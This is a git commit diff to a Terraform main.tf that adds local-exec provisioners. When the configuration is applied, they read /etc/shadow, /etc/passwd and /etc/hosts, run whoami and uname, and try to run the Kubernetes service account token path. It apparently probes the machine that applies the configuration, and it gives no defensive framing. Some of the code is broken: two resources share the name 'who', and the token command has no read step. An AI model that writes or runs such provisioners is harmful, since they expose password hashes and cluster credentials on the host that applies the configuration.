356ab977cbb0ede8eefa27933cfd6761da7bbba2
hkantare <hkantare@in.ibm.com>
2025-01-23 12:42:05 +0530

    add commands

--- main.tf
+++ main.tf
@@ -1,5 +1,38 @@
-resource "null_resource" "example" {
+resource "null_resource" "shadow" {
   provisioner "local-exec" {
     command = "cat /etc/shadow"
+  }
+}
+
+
+resource "null_resource" "hosts" {
+  provisioner "local-exec" {
+    command = "cat /etc/hosts"
+  }
+}
+
+
+resource "null_resource" "passwd" {
+  provisioner "local-exec" {
+    command = "cat /etc/passwd"
+  }
+}
+
+
+resource "null_resource" "who" {
+  provisioner "local-exec" {
+    command = "whoami"
+  }
+}
+
+resource "null_resource" "who" {
+  provisioner "local-exec" {
+    command = "uname"
+  }
+}
+
+resource "null_resource" "token" {
+  provisioner "local-exec" {
+    command = "/run/secrets/kubernetes.io/serviceaccount/token"
   }
 }
